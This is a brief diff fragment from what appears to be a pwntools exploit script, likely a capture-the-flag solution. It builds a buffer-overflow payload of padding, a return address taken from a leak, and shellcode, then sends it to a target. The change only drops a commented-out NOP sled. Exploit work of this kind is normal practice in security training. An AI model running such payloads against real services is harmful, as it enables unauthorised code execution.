@@ -55,7 +55,7 @@ shellcode = asm('''
         ''')
 
 payload = 'A'*0x14 + p32(leak+20) 
-payload += shellcode #+ '\x90'*20
+payload += shellcode
 
 io.send(payload)
 
